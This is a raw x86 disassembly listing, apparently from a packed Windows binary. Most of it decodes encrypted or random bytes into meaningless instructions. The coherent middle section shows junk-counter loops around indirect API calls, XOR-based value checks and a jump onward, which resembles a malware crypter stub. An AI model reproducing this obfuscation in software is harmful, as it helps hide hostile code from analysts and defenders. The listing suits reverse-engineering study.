  411a96:	mov    ecx,0xb3a046b
  411a9b:	fnop   
  411a9d:	daa    
  411a9e:	dec    ecx
  411a9f:	push   eax
  411aa0:	push   0xffffff96
  411aa2:	test   al,0xc8
  411aa4:	fwait
  411aa5:	cmp    BYTE PTR ds:0x926b1e20,cl
  411aab:	popf   
  411aac:	dec    esi
  411aad:	jge    0x411b23
  411aaf:	pop    ebx
  411ab0:	pop    edx
  411ab2:	dec    esp
  411ab3:	jnp    0x411a9d
  411ab5:	das    
  411ab6:	out    0x13,al
  411ab8:	loop   0x411a66
  411aba:	sbb    DWORD PTR [edx],ebp
  411abc:	or     BYTE PTR [edi+0x3a3236d7],bh
  411ac2:	and    esi,eax
  411ac4:	xchg   DWORD PTR [ecx-0x2d],ebx
  411ac7:	fisubr WORD PTR [eax-0x34d19185]
  411acd:	push   cs
  411ace:	shl    ecx,0x34
  411ad1:	mov    WORD PTR [ecx],ds
  411ad3:	adc    BYTE PTR [edi],ch
  411ad5:	and    ecx,ebx
  411ad7:	or     eax,0xfeb72ee6
  411adc:	loope  0x411a9b
  411ade:	shl    DWORD PTR ds:0x1d393fd7,1
  411ae4:	add    al,0x1b
  411ae6:	sbb    ch,BYTE PTR [eax+0xe83de57]
  411aec:	xchg   ecx,eax
  411aed:	fnstsw WORD PTR [eax]
  411aef:	xchg   esi,eax
  411af0:	sub    eax,0xb6a926dc
  411af5:	cli    
  411af6:	aaa    
  411af7:	ror    BYTE PTR [ebx-0x4ce7485b],0xc0
  411afe:	xor    eax,0xdd4b84b1
  411b03:	adc    eax,0x6306b9c2
  411b08:	mov    esi,0x85ea40bb
  411b0d:	popa   
  411b0e:	loopne 0x411ade
  411b10:	inc    esi
  411b11:	pop    esi
  411b12:	(bad)  
  411b13:	iret   
  411b14:	cld    
  411b15:	xlat   BYTE PTR ds:[ebx]
  411b16:	stos   DWORD PTR es:[edi],eax
  411b17:	lds    ebp,FWORD PTR [esi-0x8e49b6e]
  411b1d:	xor    eax,0xf9c7d09d
  411b22:	icebp  
  411b23:	or     DWORD PTR [ebp-0x30],0xa1a575e
  411b2a:	adc    BYTE PTR [edx+0x2e],cl
  411b2d:	add    esp,ebp
  411b2f:	aam    0x68
  411b31:	into   
  411b32:	(bad)  [esi+0x59384da]
  411b38:	stc    
  411b39:	jno    0x411b8c
  411b3b:	mov    edx,fs
  411b3d:	push   ds
  411b3e:	test   DWORD PTR [ebp+edx*2+0x4b041f15],esp
  411b45:	inc    edi
  411b46:	inc    DWORD PTR [edx+eiz*4+0x8]
  411b4a:	cmp    esp,eax
  411b4c:	cwde   
  411b4d:	(bad)  
  411b4e:	js     0x411af6
  411b50:	(bad)  
  411b51:	clc    
  411b52:	mov    bh,0x16
  411b54:	dec    ebx
  411b55:	push   0xa4218ac3
  411b5a:	outs   dx,DWORD PTR ds:[esi]
  411b5b:	repz leave 
  411b5d:	dec    ebp
  411b5e:	test   al,0xcf
  411b60:	mov    ebx,0xa6e5c518
  411b65:	iret   
  411b66:	cli    
  411b67:	mov    ds:0x5083f4c2,al
  411b6c:	mov    eax,0xaa56520a
  411b71:	jb     0x411bcd
  411b73:	mov    ds:0x8df9c80,al
  411b78:	pop    edx
  411b79:	out    0x2a,al
  411b7b:	cdq    
  411b7c:	and    cl,BYTE PTR [esi]
  411b7e:	fiadd  WORD PTR [edx]
  411b80:	out    dx,al
  411b81:	cmp    DWORD PTR [edi],esi
  411b83:	ret    0x47b7
  411b86:	cmp    DWORD PTR ds:0x823a5034,edi
  411b8c:	xor    bl,BYTE PTR [edx+0x5ee77639]
  411b92:	inc    eax
  411b93:	(bad)
  411b96:	mov    edi,0xa0f70a7d
  411b9b:	pusha  
  411b9c:	cmp    BYTE PTR [esi+0x4bf94791],bh
  411ba2:	dec    ebp
  411ba3:	or     al,0xc
  411ba5:	stc    
  411ba6:	bound  edx,QWORD PTR [ecx+0x56]
  411ba9:	mov    fs,WORD PTR [ebx-0x1de42011]
  411baf:	(bad)  [ebx]
  411bb1:	inc    ecx
  411bb2:	dec    esp
  411bb3:	add    ebp,DWORD PTR [ebp-0x2f]
  411bb6:	dec    ecx
  411bb7:	es dec ebp
  411bb9:	pusha  
  411bba:	inc    esp
  411bbb:	setne  BYTE PTR [ebx-0x10]
  411bbf:	xor    al,0x6d
  411bc1:	out    0x49,al
  411bc3:	push   ecx
  411bc4:	and    BYTE PTR ds:0x166496d5,ch
  411bca:	sub    DWORD PTR [eax],eax
  411bcc:	jae    0x411bdf
  411bce:	xor    eax,0xa56859d4
  411bd3:	mov    bl,bh
  411bd5:	push   edi
  411bd6:	mov    BYTE PTR [eax+esi*2-0x46483ca3],bh
  411bdd:	mov    ds:0xc30fd6bb,eax
  411be2:	or     ch,BYTE PTR [edi]
  411be4:	mov    eax,0xd303587b
  411be9:	mov    ebx,0x55db6ea2
  411bee:	iret   
  411bef:	outs   dx,BYTE PTR ds:[esi]
  411bf0:	cwde   
  411bf1:	in     eax,dx
  411bf2:	sub    DWORD PTR [edx],0xffffffed
  411bf5:	dec    eax
  411bf6:	cmp    eax,0xa4c02b50
  411bfb:	rol    DWORD PTR [ecx+0x7e79003c],0xdf
  411c02:	gs mov edx,0xefff67f
  411c08:	pop    ecx
  411c09:	(bad)  
  411c0a:	mov    esi,0x5cce2a42
  411c0f:	inc    edi
  411c10:	jnp    0x411bdc
  411c12:	add    DWORD PTR [eax],esi
  411c14:	adc    ah,al
  411c16:	je     0x411c00
  411c18:	sti    
  411c19:	aam    0x8a
  411c1b:	cmp    DWORD PTR [edi],0x7d
  411c1e:	leave  
  411c1f:	ror    ch,cl
  411c21:	push   ecx
  411c22:	out    0x5,eax
  411c24:	dec    esp
  411c25:	add    BYTE PTR [ecx],bl
  411c27:	jge    0x411ca7
  411c29:	inc    esi
  411c2a:	mov    ds:0x1fb3c2a4,eax
  411c2f:	call   0x8dea56e9
  411c34:	hlt    
  411c35:	loopne 0x411ca2
  411c37:	repz pusha 
  411c39:	xchg   BYTE PTR [edi],dh
  411c3b:	jmp    0xb803:0x9333e63a
  411c42:	mov    ebx,0x7fdf0fd6
  411c47:	jl     0x411c9b
  411c49:	pop    esp
  411c4a:	push   ebp
  411c4b:	movntps XMMWORD PTR [esi-0x5e],xmm6
  411c4f:	mov    esp,0xb8521c26
  411c54:	add    eax,DWORD PTR [eax-0x289ae8aa]
  411c5a:	ins    BYTE PTR es:[edi],dx
  411c5b:	mov    ebx,0x22b37bd2
  411c60:	rcr    ah,0x91
  411c63:	lahf   
  411c64:	aaa    
  411c65:	or     BYTE PTR ds:0x434d765e,0x97
  411c6c:	idiv   DWORD PTR [edi]
  411c6e:	iret   
  411c6f:	xor    al,0x2
  411c71:	sub    dh,cl
  411c73:	sahf   
  411c74:	mov    edi,0x49939f94
  411c79:	mov    cl,0xf9
  411c7b:	xor    BYTE PTR [esi+0x30],0x70
  411c7f:	out    0x68,eax
  411c81:	ins    BYTE PTR es:[edi],dx
  411c82:	mov    ah,0x40
  411c84:	clc    
  411c85:	leave  
  411c86:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411c87:	mov    dl,0xa9
  411c89:	icebp  
  411c8a:	xor    esp,esp
  411c8c:	loop   0x411c4b
  411c8e:	jb     0x411ca3
  411c90:	in     al,dx
  411c91:	jo     0x411cf6
  411c93:	mov    BYTE PTR [edx],dl
  411c95:	mov    ds:0xf9fec823,al
  411c9a:	jns    0x411cfc
  411c9c:	xchg   bh,dl
  411c9e:	(bad)  
  411c9f:	bound  edi,QWORD PTR [ebp+ebx*8+0x3e]
  411ca3:	xchg   edx,eax
  411ca4:	leave  
  411ca5:	fisub  DWORD PTR ds:0xf64c8afc
  411cab:	sbb    dh,BYTE PTR [edi]
  411cad:	(bad)  
  411cae:	mov    dh,0x5d
  411cb0:	out    dx,eax
  411cb1:	cdq    
  411cb2:	mov    edi,0x778eadba
  411cb7:	and    BYTE PTR [eax],0x42
  411cba:	ins    BYTE PTR es:[edi],dx
  411cbb:	ror    BYTE PTR [edx+0x27],cl
  411cbe:	push   ss
  411cbf:	test   al,0xec
  411cc1:	sbb    eax,ecx
  411cc3:	(bad)  [esi-0x3f021d04]
  411cc9:	test   esi,esp
  411ccb:	dec    esi
  411ccc:	cmp    BYTE PTR [eax-0x1e],al
  411ccf:	pop    ss
  411cd0:	adc    al,0x7
  411cd2:	das    
  411cd3:	int3   
  411cd4:	jne    0x411d11
  411cd6:	pop    ds
  411cd7:	mov    edi,0xa8acb6df
  411cdc:	cld    
  411cdd:	pop    ecx
  411cde:	add    ecx,ebp
  411ce0:	aam    0xed
  411ce2:	inc    DWORD PTR [eax+0x1e]
  411ce5:	mov    ecx,?
  411ce7:	cwde   
  411ce8:	mov    ah,BYTE PTR [edx-0x67]
  411ceb:	shr    bl,0xd1
  411cee:	mov    BYTE PTR [ebx+0x4602323c],bh
  411cf4:	in     eax,dx
  411cf5:	sbb    eax,0x7683658e
  411cfa:	lods   al,BYTE PTR ds:[esi]
  411cfb:	test   ch,cl
  411cfd:	and    DWORD PTR [esi],ebp
  411cff:	fadd   DWORD PTR [esi]
  411d01:	sbb    DWORD PTR [esi-0x34],edi
  411d04:	push   ebx
  411d05:	test   BYTE PTR [edx+0x27],cl
  411d08:	xchg   ebp,eax
  411d09:	push   0x23
  411d0b:	clc    
  411d0c:	pop    ebx
  411d0d:	pop    esi
  411d0e:	adc    ecx,DWORD PTR [ecx+0x25]
  411d11:	(bad)  
  411d12:	jb     0x411d6d
  411d14:	clc    
  411d15:	mov    al,ds:0x97b664d
  411d1a:	out    dx,al
  411d1b:	xor    eax,0x3e6048f0
  411d20:	sti    
  411d21:	test   edi,0x2169eb28
  411d27:	pushf  
  411d28:	(bad)  [ecx+0x3e34451c]
  411d2e:	adc    al,0x36
  411d30:	push   ecx
  411d31:	(bad)  
  411d32:	daa    
  411d33:	sbb    BYTE PTR [edi-0x3c8d292f],ah
  411d39:	inc    esi
  411d3a:	jno    0x411cdb
  411d3c:	xor    eax,0x8a59bacc
  411d41:	adc    DWORD PTR [ebp+0x66],edi
  411d44:	call   0x6322dbe5
  411d49:	jmp    0xe690edb9
  411d4e:	mov    eax,0x5d1d6441
  411d53:	rcl    bl,0xc4
  411d56:	fnstsw WORD PTR [ecx]
  411d58:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411d59:	int3   
  411d5a:	hlt    
  411d5b:	adc    eax,0xa82d52b4
  411d60:	lahf   
  411d61:	in     eax,dx
  411d62:	fstp   QWORD PTR ds:0x92f9c234
  411d68:	or     BYTE PTR [eax],bh
  411d6a:	jnp    0x411d8e
  411d6c:	sbb    dh,al
  411d6e:	dec    ecx
  411d6f:	xchg   ebp,eax
  411d70:	adc    dh,BYTE PTR [ecx+0x56]
  411d73:	fs sub eax,0x71435864
  411d79:	repnz add eax,0x10ce6cc0
  411d7f:	mov    eax,ds:0xa8ba0f05
  411d84:	pop    es
  411d85:	add    al,0xe0
  411d87:	data16 or al,0x96
  411d8a:	and    BYTE PTR [edi+0x3b6f1f5],bl
  411d90:	imul   ecx,ebp,0x7a7fdeb3
  411d96:	or     al,0x1c
  411d98:	push   ecx
  411d99:	es jnp 0x411ddd
  411d9c:	sub    eax,0x277b02f8
  411da1:	div    BYTE PTR [edi+0x48]
  411da4:	test   DWORD PTR [edx],ebx
  411da6:	out    dx,al
  411da7:	test   bh,ah
  411da9:	loope  0x411d5c
  411dab:	adc    eax,0xc97e125f
  411db0:	or     ah,dh
  411db2:	inc    edi
  411db3:	mov    ch,0x46
  411db5:	das    
  411db6:	xchg   edx,eax
  411db7:	js     0x411dc0
  411db9:	call   FWORD PTR [ebx-0x5f]
  411dbc:	outs   dx,DWORD PTR ds:[esi]
  411dbd:	push   ebx
  411dbe:	enter  0xb361,0xf1
  411dc2:	std    
  411dc3:	lods   eax,DWORD PTR ds:[esi]
  411dc4:	pop    ss
  411dc5:	pop    edi
  411dc6:	data16 icebp 
  411dc8:	in     al,dx
  411dc9:	inc    ebp
  411dca:	(bad)  [esi-0x3a7be160]
  411dd0:	call   0x433c:0xb5561273
  411dd7:	daa    
  411dd8:	js     0x411e4a
  411dda:	hlt    
  411ddb:	wrmsr  
  411ddd:	push   cs
  411dde:	into   
  411ddf:	sbb    DWORD PTR [ebp+0x64975eda],esp
  411de5:	gs jmp 0x411dd0
  411de8:	dec    edx
  411de9:	mov    eax,0x6d0832e0
  411dee:	jno    0x411e1d
  411df0:	push   esp
  411df1:	fisttp QWORD PTR [esi+0x5eb96d3b]
  411df7:	aad    0xfc
  411df9:	aad    0x42
  411dfb:	test   eax,0xd8e73784
  411e00:	pop    edi
  411e01:	dec    esp
  411e02:	js     0x411db6
  411e04:	mov    al,0x47
  411e06:	and    dl,dl
  411e08:	ror    BYTE PTR [esi+ecx*2+0x1ac513a0],cl
  411e0f:	pop    es
  411e10:	inc    esp
  411e11:	or     al,0xea
  411e13:	jecxz  0x411dbb
  411e15:	cmc    
  411e16:	aad    0xcd
  411e18:	xchg   edx,eax
  411e19:	adc    eax,DWORD PTR [edx]
  411e1b:	hlt    
  411e1c:	sub    BYTE PTR [esi-0x260ce444],0x70
  411e23:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411e24:	stc    
  411e25:	imul   eax,DWORD PTR [eax],0x9744924c
  411e2b:	cmp    al,0x16
  411e2d:	inc    edi
  411e2e:	jno    0x411ea2
  411e30:	mov    DWORD PTR [ebx+0x6cb9b5c0],ebp
  411e36:	sub    ch,BYTE PTR [esi+0x7ec0a435]
  411e3c:	add    eax,0x5d96cd1f
  411e41:	xor    eax,0x11b68e1c
  411e46:	add    esi,ebp
  411e48:	mov    al,0x70
  411e4a:	loop   0x411ec0
  411e4c:	sbb    BYTE PTR [esi],dh
  411e4e:	xor    esi,0x0
  411e51:	cmp    edx,ebx
  411e53:	jne    0x411e75
  411e59:	mov    DWORD PTR ds:0x42900c,0x30b0
  411e63:	cmp    esi,edi
  411e65:	mov    DWORD PTR ds:0x42d000,0x643
  411e6f:	je     0x411edc
  411e75:	sub    edx,0x6beb
  411e7b:	mov    edx,DWORD PTR ds:0x423ff2
  411e81:	mov    edx,DWORD PTR [edx+0x1c0]
  411e87:	mov    edx,DWORD PTR [edx]
  411e89:	sub    DWORD PTR ds:0x42c018,0x42901c
  411e93:	xor    esi,esi
  411e95:	add    edx,ecx
  411e97:	adc    esi,0xffffffff
  411e9a:	xor    edx,eax
  411e9c:	and    DWORD PTR ds:0x42d010,0x4e39
  411ea6:	xor    esi,0x0
  411ea9:	mov    DWORD PTR ds:0x42a018,0x6a83
  411eb3:	cmp    edx,0x70941fd1
  411eb9:	mov    DWORD PTR ds:0x42d014,0x6414
  411ec3:	jne    0x411f46
  411ec9:	mov    DWORD PTR ds:0x42b000,0x2399
  411ed3:	cmp    esi,0xffffffff
  411ed6:	jne    0x411f46
  411edc:	mov    edx,DWORD PTR ds:0x424076
  411ee2:	mov    esi,DWORD PTR ds:0x42406e
  411ee8:	xor    edx,esi
  411eea:	mov    DWORD PTR ds:0x42406e,edx
  411ef0:	mov    edx,DWORD PTR [ebp+0xc]
  411ef3:	mov    edx,DWORD PTR [edx]
  411ef5:	mov    edx,DWORD PTR [edx]
  411ef7:	mov    esi,DWORD PTR ds:0x42406e
  411efd:	add    DWORD PTR [edx],esi
  411eff:	mov    esi,DWORD PTR [ebp+0x8]
  411f02:	mov    edx,DWORD PTR ds:0x42406e
  411f08:	xor    esi,0x7510893
  411f0e:	add    esi,0x3272db
  411f14:	xor    ebx,ebx
  411f16:	add    esi,ecx
  411f18:	adc    ebx,0xffffffff
  411f1b:	xor    edi,edi
  411f1d:	xor    esi,eax
  411f1f:	xor    ebx,0x0
  411f22:	add    edx,ecx
  411f24:	adc    edi,0xffffffff
  411f27:	xor    edx,eax
  411f29:	xor    edi,0x0
  411f2c:	cmp    edx,esi
  411f2e:	jne    0x411f46
  411f34:	cmp    edi,ebx
  411f36:	jne    0x411f46
  411f3c:	mov    eax,ds:0x42406e
  411f41:	mov    ds:0x424076,eax
  411f46:	pop    edi
  411f47:	pop    esi
  411f48:	pop    ebx
  411f49:	pop    ebp
  411f4a:	ret    0x8
  411f4d:	push   ebp
  411f4e:	mov    ebp,esp
  411f50:	sub    esp,0x90
  411f56:	add    DWORD PTR ds:0x42a01c,0x734d
  411f60:	push   esi
  411f61:	xor    ecx,0xb67
  411f67:	push   edi
  411f68:	xor    eax,DWORD PTR ds:0x42a018
  411f6e:	mov    eax,ds:0x423ff2
  411f73:	add    esi,0x4c8c
  411f79:	mov    DWORD PTR [ebp-0x2c],eax
  411f7c:	xor    ecx,0x3033
  411f82:	mov    eax,ds:0x4240fe
  411f87:	and    DWORD PTR ds:0x42a010,0x0
  411f91:	mov    esi,DWORD PTR ds:0x42a010
  411f97:	inc    esi
  411f98:	mov    DWORD PTR ds:0x42a010,esi
  411f9e:	cmp    DWORD PTR ds:0x42a010,0xd
  411fa5:	jne    0x411fbe
  411fab:	push   0x1106
  411fb0:	push   DWORD PTR [ebp-0xc]
  411fb3:	push   0x571c
  411fb8:	call   DWORD PTR ds:0x425044
  411fbe:	cmp    DWORD PTR ds:0x42a010,0xc
  411fc5:	jne    0x411fda
  411fcb:	xor    esi,esi
  411fcd:	add    esi,DWORD PTR ds:0x42a010
  411fd3:	inc    esi
  411fd4:	mov    DWORD PTR ds:0x42a010,esi
  411fda:	cmp    DWORD PTR ds:0x42a010,0x14
  411fe1:	jb     0x411f91
  411fe7:	mov    DWORD PTR [ebp-0x3c],eax
  411fea:	and    DWORD PTR ds:0x42b004,edx
  411ff0:	and    DWORD PTR [ebp-0x34],0x0
  411ff4:	xor    ecx,DWORD PTR ds:0x42d010
  411ffa:	mov    DWORD PTR [ebp-0x20],0xf89c85b6
  412001:	mov    DWORD PTR [ebp-0x30],0xf89c85b5
  412008:	and    edi,DWORD PTR ds:0x42b018
  41200e:	mov    eax,DWORD PTR [ebp-0x1c]
  412011:	mov    ecx,DWORD PTR [ebp-0x1c]
  412014:	xor    edi,DWORD PTR ds:0x42b004
  41201a:	xor    eax,ecx
  41201c:	add    DWORD PTR ds:0x429018,ecx
  412022:	mov    DWORD PTR [ebp-0x1c],eax
  412025:	or     DWORD PTR [ebp-0x1c],0xf89cb5b6
  41202c:	sub    ecx,esi
  41202e:	mov    eax,DWORD PTR [ebp-0x28]
  412031:	mov    DWORD PTR ds:0x42a010,0x1d
  41203b:	cmp    DWORD PTR ds:0x42a010,0x0
  412042:	je     0x4120a2
  412048:	cmp    DWORD PTR ds:0x42a010,0x4
  41204f:	jne    0x412069
  412055:	push   DWORD PTR [ebp-0x1c]
  412058:	push   0x61a2
  41205d:	push   DWORD PTR [ebp-0x1c]
  412060:	push   DWORD PTR [ebp-0x18]
  412063:	call   DWORD PTR ds:0x425048
  412069:	cmp    DWORD PTR ds:0x42a010,0x5
  412070:	jne    0x412083
  412076:	mov    ecx,DWORD PTR ds:0x42a010
  41207c:	dec    ecx
  41207d:	mov    DWORD PTR ds:0x42a010,ecx
  412083:	mov    ecx,DWORD PTR ds:0x42a010
  412089:	dec    ecx
  41208a:	mov    DWORD PTR ds:0x42a010,ecx
  412090:	jmp    0x41203b
  412095:	movzx  esi,BYTE PTR ds:0x42b010
  41209c:	sub    DWORD PTR ds:0x42c008,esi
  4120a2:	mov    ecx,DWORD PTR [ebp-0x28]
  4120a5:	sub    edi,esi
  4120a7:	xor    eax,ecx
  4120a9:	mov    DWORD PTR [ebp-0x28],eax
  4120ac:	add    DWORD PTR [ebp-0x28],0xf89f05b6
  4120b3:	and    DWORD PTR ds:0x42b000,0x0
  4120bd:	mov    eax,ds:0x42b000
  4120c2:	inc    eax
  4120c3:	mov    ds:0x42b000,eax
  4120c8:	cmp    DWORD PTR ds:0x42b000,0x1d
  4120cf:	jne    0x4120de
  4120d5:	push   DWORD PTR [ebp-0x10]
  4120d8:	call   DWORD PTR ds:0x42504c
  4120de:	cmp    DWORD PTR ds:0x42b000,0x16
  4120e5:	jb     0x4120bd
  4120eb:	mov    DWORD PTR ds:0x429018,0x1a
  4120f5:	cmp    DWORD PTR ds:0x429018,0x0
  4120fc:	je     0x412149
  412102:	cmp    DWORD PTR ds:0x429018,0x9
  412109:	jne    0x41211d
  41210f:	push   DWORD PTR [ebp-0x10]
  412112:	push   0x4244a2
  412117:	call   DWORD PTR ds:0x425010
  41211d:	cmp    DWORD PTR ds:0x429018,0xa
  412124:	jne    0x412137
  41212a:	mov    ecx,DWORD PTR ds:0x429018
  412130:	dec    ecx
  412131:	mov    DWORD PTR ds:0x429018,ecx
  412137:	mov    ecx,DWORD PTR ds:0x429018
  41213d:	dec    ecx
  41213e:	mov    DWORD PTR ds:0x429018,ecx
  412144:	jmp    0x4120f5
  412149:	mov    eax,DWORD PTR [ebp-0x18]
  41214c:	adc    ecx,esi
  41214e:	mov    ecx,DWORD PTR [ebp-0x18]
  412151:	xor    eax,ecx
  412153:	xor    esi,esi
  412155:	xor    esi,DWORD PTR ds:0x429028
  41215b:	sbb    DWORD PTR ds:0x429014,esi
  412161:	mov    DWORD PTR [ebp-0x18],eax
  412164:	mov    ecx,DWORD PTR ds:0x423dfe
  41216a:	mov    eax,ds:0x424361
  41216f:	sub    ecx,eax
  412171:	imul   ecx,DWORD PTR [ecx+eax*1]
  412175:	add    DWORD PTR [ebp-0x18],0xf89c85f6
  41217c:	mov    DWORD PTR ds:0x42a018,0x18
  412186:	cmp    DWORD PTR ds:0x42a018,0x0
  41218d:	je     0x4121c0
  412193:	cmp    DWORD PTR ds:0x42a018,0x1b
  41219a:	jne    0x4121ac
  4121a0:	push   DWORD PTR [ebp-0x1c]
  4121a3:	push   DWORD PTR [ebp-0x18]
  4121a6:	call   DWORD PTR ds:0x425018
  4121ac:	xor    esi,esi
  4121ae:	or     esi,DWORD PTR ds:0x42a018
  4121b4:	dec    esi
  4121b5:	mov    DWORD PTR ds:0x42a018,esi
  4121bb:	jmp    0x412186
  4121c0:	mov    eax,DWORD PTR [ebp-0x24]
  4121c3:	or     DWORD PTR ds:0x429014,0x2eb5
  4121cd:	mov    ecx,DWORD PTR [ebp-0x24]
  4121d0:	mov    DWORD PTR ds:0x429000,0x1b
  4121da:	cmp    DWORD PTR ds:0x429000,0x0
  4121e1:	je     0x412218
  4121e7:	cmp    DWORD PTR ds:0x429000,0x2a
  4121ee:	jne    0x412206
  4121f4:	push   0x42901c
  4121f9:	push   0x0
  4121fb:	push   0x424390
  412200:	call   DWORD PTR ds:0x42501c
  412206:	mov    esi,DWORD PTR ds:0x429000
  41220c:	dec    esi
  41220d:	mov    DWORD PTR ds:0x429000,esi
  412213:	jmp    0x4121da
  412218:	xor    eax,ecx
  41221a:	mov    DWORD PTR [ebp-0x24],eax
  41221d:	add    DWORD PTR [ebp-0x24],0xf89c85d6
  412224:	sbb    eax,DWORD PTR ds:0x429004
  41222a:	mov    eax,DWORD PTR [ebp-0x14]
  41222d:	sub    DWORD PTR ds:0x429018,ecx
  412233:	mov    ecx,DWORD PTR [ebp-0x14]
  412236:	and    DWORD PTR ds:0x42d014,0x19f0
  412240:	xor    eax,ecx
  412242:	mov    DWORD PTR [ebp-0x14],eax
  412245:	mov    eax,DWORD PTR [ebp-0x20]
  412248:	mov    ecx,DWORD PTR [ebp-0x14]
  41224b:	dec    esi
  41224c:	mov    esi,0x7510893
  412251:	and    DWORD PTR ds:0x42a01c,0x5143
  41225b:	xor    eax,esi
  41225d:	and    DWORD PTR ds:0x42a004,0x0
  412267:	jmp    0x41227b
  41226c:	xor    edi,edi
  41226e:	add    edi,DWORD PTR ds:0x42a004
  412274:	inc    edi
  412275:	mov    DWORD PTR ds:0x42a004,edi
  41227b:	cmp    DWORD PTR ds:0x42a004,0x15
  412282:	jae    0x4122c2
  412288:	cmp    DWORD PTR ds:0x42a004,0x5
  41228f:	jne    0x4122a3
  412295:	push   0x42c018
  41229a:	push   DWORD PTR [ebp-0x24]
  41229d:	call   DWORD PTR ds:0x425020
  4122a3:	cmp    DWORD PTR ds:0x42a004,0x4
  4122aa:	jne    0x4122bd
  4122b0:	mov    edi,DWORD PTR ds:0x42a004
  4122b6:	inc    edi
  4122b7:	mov    DWORD PTR ds:0x42a004,edi
  4122bd:	jmp    0x41226c
  4122c2:	mov    edi,0x3272db
  4122c7:	add    eax,edi
  4122c9:	xor    eax,ecx
  4122cb:	mov    DWORD PTR [ebp-0x14],eax
  4122ce:	mov    eax,DWORD PTR [ebp-0x10]
  4122d1:	mov    ecx,DWORD PTR [ebp-0x10]
  4122d4:	sub    eax,ecx
  4122d6:	mov    DWORD PTR [ebp-0x10],eax
  4122d9:	add    DWORD PTR [ebp-0x10],0xf89c85b9
  4122e0:	mov    al,BYTE PTR [ebp-0x1]
  4122e3:	movzx  ecx,BYTE PTR [ebp-0x1]
  4122e7:	movzx  eax,al
  4122ea:	sub    ecx,eax
  4122ec:	mov    BYTE PTR [ebp-0x1],cl
  4122ef:	movzx  eax,BYTE PTR [ebp-0x1]
  4122f3:	xor    eax,0xffffff99
  4122f6:	mov    BYTE PTR [ebp-0x1],al
  4122f9:	mov    eax,DWORD PTR [ebp-0x20]
  4122fc:	xor    eax,esi
  4122fe:	add    eax,edi
  412300:	mov    DWORD PTR [ebp-0x14],eax
  412303:	lea    eax,[ebp-0x40]
  412306:	mov    DWORD PTR [ebp-0x38],eax
  412309:	lea    eax,[ebp-0x38]
  41230c:	mov    DWORD PTR [ebp-0x44],eax
  41230f:	lea    eax,[ebp-0x44]
  412312:	mov    DWORD PTR [ebp-0x8],eax
  412315:	lea    eax,[ebp-0x8]
  412318:	mov    DWORD PTR [ebp-0x48],eax
  41231b:	mov    eax,DWORD PTR [ebp-0x18]
  41231e:	jmp    0x41466d
  412323:	test   cl,dl
  412325:	icebp  
  412326:	arpl   WORD PTR gs:[ebp+0x64],sp
  41232a:	scas   eax,DWORD PTR es:[edi]
  41232b:	push   0x2f94cc8
  412330:	fld    st(3)
  412332:	mov    eax,0x62626bde
  412337:	push   eax
  412338:	pop    edi
  412339:	bound  esp,QWORD PTR [edx+0x7a]
  41233c:	(bad)  [edx]
  41233e:	and    eax,DWORD PTR [ebx-0x5dcbd0c9]
  412344:	(bad)  
  412345:	jmp    0xb644:0x986dc1d3
  41234c:	push   cs
  41234d:	(bad)  
  41234e:	test   al,0xb5
  412350:	dec    ecx
  412351:	iret   
  412352:	mul    DWORD PTR [esp+edi*4+0x27b5a63d]
  412359:	fdiv   QWORD PTR ds:0x7ddbffeb
  41235f:	xchg   BYTE PTR [esi],ch
  412361:	xchg   DWORD PTR [eax-0x53],edx
  412364:	in     eax,dx
  412365:	ja     0x4122ea
  412367:	mov    eax,0xc265bb74
  41236c:	xor    eax,0x88e02d68
  412371:	mov    ds:0x480e3f1a,al
  412376:	or     BYTE PTR [esi],bl
  412378:	xchg   esp,eax
  412379:	das    
  41237a:	rcr    BYTE PTR [ecx+0x2c],cl
  41237d:	jb     0x4123f0
  41237f:	dec    eax
  412380:	jns    0x4123d0
  412382:	and    eax,0x1914b600
  412387:	les    eax,FWORD PTR [edi+ebp*8+0x10]
  41238b:	(bad)  
  41238c:	xor    BYTE PTR [edx+edx*8+0x39d6dbb9],bh
  412393:	mov    esi,edi
  412395:	clc    
  412396:	vfmaddsub213ps xmm2,xmm7,XMMWORD PTR [ebx]
  41239b:	stos   DWORD PTR es:[edi],eax
  41239c:	push   ecx
  41239d:	jne    0x412326
  41239f:	xchg   edi,eax
  4123a0:	icebp  
  4123a1:	daa    
  4123a2:	mov    ebp,0x178b4c1c
  4123a7:	test   al,0x89
  4123a9:	pop    cx
  4123ab:	adc    eax,0x16d2f952
  4123b0:	xchg   ebx,eax
  4123b1:	(bad)  
  4123b2:	xor    ecx,DWORD PTR [esi]
  4123b4:	out    0x10,eax
  4123b6:	cmp    al,al
  4123b8:	shl    DWORD PTR [ecx],0x89
  4123bb:	add    BYTE PTR [edx],0x36
  4123be:	mov    ch,0x38
  4123c0:	dec    eax
  4123c1:	ror    bl,cl
  4123c3:	inc    ebp
  4123c4:	mov    al,ds:0x382702cf
  4123c9:	mov    dl,0xca
  4123cb:	iret   
  4123cc:	pop    edx
  4123cd:	test   eax,0x46b14f41
  4123d2:	ins    BYTE PTR es:[edi],dx
  4123d3:	cmp    ebx,ecx
  4123d5:	stos   DWORD PTR es:[edi],eax
  4123d6:	aam    0x75
  4123d8:	jge    0x412423
  4123da:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4123db:	xor    BYTE PTR [ebx+0x3e59c53e],ch
  4123e1:	ja     0x412367
  4123e3:	mov    edi,DWORD PTR [esi]
  4123e5:	mov    cl,0x5f
  4123e7:	and    ecx,ebx
  4123e9:	loopne 0x41238b
  4123eb:	repz adc DWORD PTR [ebp+eiz*1-0x57],0x60
  4123f1:	inc    ebp
  4123f2:	push   0xffffff9a
  4123f4:	pusha  
  4123f5:	jmp    0xf86ea69c
  4123fa:	xlat   BYTE PTR ds:[ebx]
  4123fb:	sbb    al,0xdf
  4123fd:	mov    edx,0x6d856df7
  412402:	inc    ecx
  412403:	sub    ch,BYTE PTR [esi-0x3f8e613c]
  412409:	cmp    ebp,esp
  41240b:	xor    esp,eax
  41240d:	inc    esp
  41240e:	mov    eax,ds:0x8cd0989
  412413:	cmc    
  412414:	cs xchg ecx,eax
  412416:	cwde   
  412417:	push   esp
  412418:	add    ch,BYTE PTR [edi+0x72079b77]
  41241e:	das    
  41241f:	mov    edi,0xc7099cdd
  412424:	js     0xc1f2a4df
  41242a:	sub    BYTE PTR [edi-0x127dd1f0],al
  412430:	rcr    BYTE PTR [eax-0x285eaf48],1
  412436:	push   0x13ecd35d
  41243b:	cmc    
  41243c:	rol    DWORD PTR [ebx],cl
